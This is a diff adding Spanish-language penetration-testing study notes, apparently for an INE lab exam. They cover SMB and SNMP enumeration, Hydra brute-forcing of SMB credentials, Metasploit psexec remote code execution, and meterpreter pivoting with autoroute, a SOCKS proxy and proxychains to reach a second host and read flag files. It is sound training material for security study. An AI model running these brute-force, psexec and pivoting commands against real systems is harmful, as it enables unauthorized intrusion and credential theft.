@@ -2033,11 +2033,158 @@ nmap -sS -sV -F -T4 <ip>
 
 ```bash
 
+10.4.21.34 demo.ine.local # target directo
+10.4.23.202 demo1.ine.local # target al que se llega vía pivoting
+
+nmap demo.ine.local # scan inicial, top 1000 puertos
+
+nmap -sV -p 139,445 demo.ine.local
+# 139 = NetBIOS Session Service
+# 445 = SMB directo sobre TCP (sin NetBIOS)
+# -sV para ver versión del servicio SMB
+
+nmap -p445 --script=smb-protocols.nse demo.ine.local
+# enumera qué versiones del protocolo SMB soporta el host (SMBv1, v2, v3)
+
+nmap -p445 --script=smb-security-mode demo.ine.local # verificamos el guest
+# revisa el modo de seguridad SMB (user/share level) y si permite login "guest"
+
+smbclient -L demo.ine.local
+# lista los recursos compartidos (shares) del host
+# presionamos enter -> acepta conexión anónima (sin password)
+
+nmap -p445 --script=smb-shares.nse demo.ine.local
+# enumera los shares SMB disponibles vía script NSE (alternativa a smbclient)
+
+nmap -p445 --script smb-enum-users.nse demo.ine.local
+# enumera usuarios del sistema vía SMB
+# agregamos los usuarios encontrados a un users.txt
+
+hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
+# -L = lista de usuarios | -P = lista de passwords
+# fuerza bruta de credenciales SMB con Hydra
+
+msfconsole -q
+use exploit/windows/smb/psexec
+set RHOSTS 10.4.21.34
+set SMBUser administrator
+set SMBPass password1
+run
+# psexec: usa credenciales válidas (admin) para ejecutar código remoto vía SMB
+# obtenemos sesión de meterpreter
+
+# Buscamos la primera flag desde meterpreter:
+cat C:\\Users\\Administrator\\Documents\\FLAG1.txt
+
+# --- Pivoting hacia demo1.ine.local (10.4.23.202) ---
+
+shell
+ping 10.4.23.202
+# CTRL+C para salir de la shell nativa y volver a meterpreter
+
+run autoroute -s 10.4.23.202/20
+# autoroute = agrega una ruta a través de la sesión meterpreter
+# para poder alcanzar la subnet 10.4.23.202/20 desde nuestra máquina
+
+background
+# manda la sesión meterpreter a segundo plano
+
+use auxiliary/server/socks_proxy
+set SRVPORT 9050
+set VERSION 4a
+exploit
+# levanta un proxy SOCKS sobre la sesión meterpreter
+# -> permite rutear herramientas externas (nmap, etc.) a través del pivot
+
+# verificamos puerto y versión del proxy en /etc/proxychains4.conf (otra terminal)
+
+proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
+# escaneo del segundo host usando proxychains + el socks_proxy
+# -sT obligatorio (SYN scan -sS no funciona a través de proxychains)
+
+# Volvemos a la sesión de meterpreter:
+sessions -i 1
+shell
+net view 10.4.23.202
+# System error 5 -> access denied / no se puede listar aún
+
+# Migramos el proceso para tener más estabilidad/permisos:
+# CTRL+C para salir de la shell
+migrate -N explorer.exe
+
+shell
+net view 10.4.23.202             # ahora sí lista los recursos compartidos
+net use D: \\10.4.23.202\Documents   # mapea el share Documents como unidad D:
+net use K: \\10.4.23.202\K$          # mapea share administrativo K$
+
+# CTRL+C para salir
+cat D:\\Confidential.txt
+cat D:\\FLAG2.txt
+
+# Extra: herramientas útiles para enumeración SMB/NetBIOS
+nbtscan 10.4.30.139   # escaneo NetBIOS de la red, muestra nombres/servicios
+nmblookup -A 10.4.30.139  # consulta NetBIOS name table de un host específico
+
+# Puntos clave para el examen
+# 139 = NetBIOS Session Service | 445 = SMB directo (moderno, sin NetBIOS)
+# smbclient -L y --script smb-shares.nse = dos formas de enumerar shares
+# psexec = requiere credenciales válidas (admin) para RCE vía SMB
+# autoroute + socks_proxy + proxychains = técnica clásica de pivoting con Meterpreter
+# migrate -N explorer.exe = estabiliza la sesión moviéndola a un proceso más "seguro"
+# net use = mapea shares SMB remotos como unidades locales (Windows)
 ```
 
 #### SNMP Enumeration
 
 ```bash
+nmap -sU -p 161 demo.ine.local
+# escaneo UDP del puerto 161 (SNMP)
+# SNMP corre sobre UDP, no TCP
+
+nmap -sU -p 161 --script=snmp-brute demo.ine.local
+# fuerza bruta contra el community string SNMP (default: usa wordlist propia de Nmap)
+# SNMPv1/v2c se autentican con un "community string" en vez de user/password
+
+snmpwalk -v 1 -c public demo.ine.local
+# -v 1 = usa SNMP versión 1
+# -c public = community string (público es el default más común/inseguro)
+# "camina" todo el árbol MIB del host, volcando toda la info disponible vía SNMP
+# (usuarios, procesos, software instalado, interfaces de red, etc.)
+
+nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_output
+# corre TODOS los scripts NSE que empiecen con "snmp-" (wildcard)
+# > snmp_output = guarda el resultado completo en un archivo
+
+ls
+# revisamos el archivo generado, y de ahí extraemos usuarios encontrados
+# metemos los usuarios a un users.txt
+
+hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
+# fuerza bruta de credenciales SMB usando los usuarios que sacamos por SNMP
+# (SNMP filtró usuarios válidos del sistema -> ahora se prueban contra SMB)
+
+msfconsole -q
+use exploit/windows/smb/psexec
+show options
+set RHOSTS demo.ine.local
+set SMBUSER administrator
+set SMBPASS elizabeth
+exploit
+# psexec con las credenciales encontradas -> ejecución remota de código vía SMB
+
+shell
+cd C:\
+dir
+type FLAG1.txt
+# shell nativa de Windows: dir = listar archivos | type = mostrar contenido de archivo
+
+# Puntos clave para el examen
+# SNMP corre sobre UDP/161, se autentica con "community string" (no user/pass)
+# community strings default más comunes: "public" (read-only) y "private" (read-write)
+# snmpwalk = vuelca toda la info MIB expuesta por el dispositivo (muy verboso)
+# SNMP mal configurado suele filtrar usuarios válidos del sistema -> pivote para
+# ataques de fuerza bruta en otros servicios (SMB, SSH, etc.)
+# snmp-brute (NSE) = fuerza bruta de community strings
 
 ```
 
